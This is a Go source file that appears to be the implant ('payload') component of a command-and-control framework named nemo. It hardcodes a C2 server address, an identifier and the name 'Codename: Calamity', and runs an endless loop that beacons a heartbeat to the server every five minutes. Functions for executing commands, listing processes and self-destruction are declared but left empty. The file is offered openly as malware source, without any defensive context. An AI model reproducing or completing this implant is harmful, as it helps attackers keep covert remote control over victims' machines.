package payload

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/CompeyDev/nemo/common/logger"
)

var CONNECTION_URI = "http://0.0.0.0:40043"
var SELF_IDENTIFIER = "dc54c6bb9ef1fcf341b006595e583f073280fb2851c67f6ee6426b985556647e"
var SELF_CUSTOM_NAME = "Codename: Calamity"

func Run() {
	for true {
		SendHeartbeat()
		time.Sleep(5 * time.Minute)
	}

}

func ExecuteCommand() {

}

func ListProcesses() {

}

func DestroySelf() {

}

func SendHeartbeat() {
	values := map[string]string{
		"id": SELF_IDENTIFIER,
		"name": SELF_CUSTOM_NAME,
	}
	jsonBody, encodingErr := json.Marshal(values)

	if encodingErr != nil {
		logger.CustomInfo("PayloadService", "Failed to generate JSON Request body.")
	}

	response, error := http.Post(fmt.Sprintf("%s/heartbeat", CONNECTION_URI), "application/json", bytes.NewBuffer(jsonBody))
	if error != nil {
		logger.CustomError("PayloadService", fmt.Sprintf("Failed to send heartbeat with error `%s`", fmt.Sprint(error)))
	} else if response.StatusCode != 200 {
		logger.CustomError("PayloadService", fmt.Sprintf("Received error heartbeat response with status code %d", response.StatusCode))
	} else {
		logger.CustomInfo("PayloadService", fmt.Sprintf("Received heartbeat response with status code %d", response.StatusCode))
		defer response.Body.Close()
		if response.StatusCode == 200 {
			logger.CustomInfo("PayloadService", "Checked in with server successfully.")
		}
	}
}
